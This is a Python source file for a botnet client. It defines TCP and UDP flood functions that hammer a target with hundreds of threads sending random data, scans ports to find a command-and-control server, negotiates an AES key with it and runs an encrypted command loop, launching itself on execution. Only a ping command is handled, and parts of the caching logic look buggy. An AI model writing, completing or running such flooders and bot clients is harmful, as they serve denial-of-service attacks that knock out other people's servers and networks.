import base64,socket,threading
from Encryptor import AES_Encryption
import socket,struct,threading,os

def TCP_RESET(s,size):
  try:
   for _ in range(250):s.sendall(os.urandom(size)); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
   s.shutdown(socket.SHUT_RDWR); s.close()
  except:pass

def CNC(addr,size):
  try:
     for _ in range(250):
      s = socket.create_connection(addr)
      threading.Thread(target=TCP_RESET,args=(s,size)).start()
  except Exception as e:print(e)

def UDP_ATTACK(s,size,addr):
    try:
        for _ in range(2500):[s.sendto(os.urandom(size),addr) for _ in range(15)]
    except:
       pass

def SOC(addr,size):
  try:
     for _ in range(250):
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      threading.Thread(target=UDP_ATTACK,args=(s,size,addr)).start()
  except:pass

IP = '127.0.0.1'
PORT = 1

def cryptor(key,iv,data,mode='enc'):
 crypt = AES_Encryption(key=key, iv=iv, mode=2)
 if mode == 'enc':
  return base64.b64encode(crypt.encrypt(data))
 else:
  a = base64.b64decode(data)
  try:return base64.b64encode(crypt.decrypt(a).encode())
  except:return base64.b64encode(crypt.encrypt(data))

def get_mykey():
 global PORT
 try:
  key = []
  while True:
   if PORT > 65535:return False; break
   while True:
    try:
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect((IP,PORT)); break
    except:PORT += 1
   s.send(b'ECHO AES256')
   data = s.recv(65536).decode()
   if data == 'AES256':
    s.send(b'AES256 CREATE')
    aes = s.recv(65536).decode().split('#')
    s.send(f'AES256 AUTH {aes[0]} {aes[1]}'.encode())
    s.send(f"AES256 TEST {cryptor(aes[0],aes[1],s.recv(65536),'dec').decode()}".encode())
    code = 0
    while True:
     a = s.recv(65536).decode()
     if not a:
      continue
     if a == 'PASSED':
      key = aes; code = 0; break
    if code == 0:break
    s.close()
   else:PORT += 1
  return key,s
 except Exception as e:print(e); return False,False

cache_command = []
cache_response = []

def process_cache(mode,cache,data,a):
 if data == a[0]:
     if mode == 'command':cache_command.append([data,cache])
     elif mode == 'resp':cache_response.append([data,cache])

def find_cache(mode,data,key):
 global cache_command,cache_response
 count = 0
 d = ''
 code = False
 code2 = cryptor(key[0],key[1],data,'dec')
 while True:
  try:
    if mode == 'command':
     d = cache_command[count]
    else:d = cache_response[count]
    if d[0] == data:code = d[1]; code2 = ''; break
    count += 1
  except Exception as e:print(e); break
 return [code,code2]

def process_resp(s,resp,key):
 com = find_cache("resp",resp,key)
 if com[0] == False:
    com.remove(com[0])
    if len(cache_response) != 0:
     for a in cache_response:
      threading.Thread(target=process_cache,args=("resp",com[0],resp,a)).start()
    else:cache_response.append([resp,com[0]])
 s.send(com[0])

def command(s,command,key):
 global cache_response,cache_command
 try:
  com = base64.b64decode(command).decode().split(' ')
  if com[0].upper() == 'PING':threading.Thread(target=process_resp,args=(s,f'PONG {com[1]}',key)).start()
  else:threading.Thread(target=process_resp,args=(s,'NOT FOUND COMMAND',key)).start()
  print(base64.b64decode(command.decode()))
 except Exception as e:print(e)

def botnet():
 global cache_command,cache_response
 try:
  key,s = get_mykey()
  if key != False:
   while True:
    if len(cache_response) > 150:cache_response.clear()
    if len(cache_command) > 150:cache_command.clear()
    data = s.recv(65536)
    com = find_cache("command",data,key)
    if com[0] == False:
     com.remove(com[0])
     if len(cache_command) != 0:
      for a in cache_command:
       threading.Thread(target=process_cache,args=("command",com[0],data,a)).start()
     else:
      cache_command.append([data,com[0]])
    threading.Thread(target=command,args=(s,com[0],key)).start()
 except Exception as e:print(e); pass

botnet()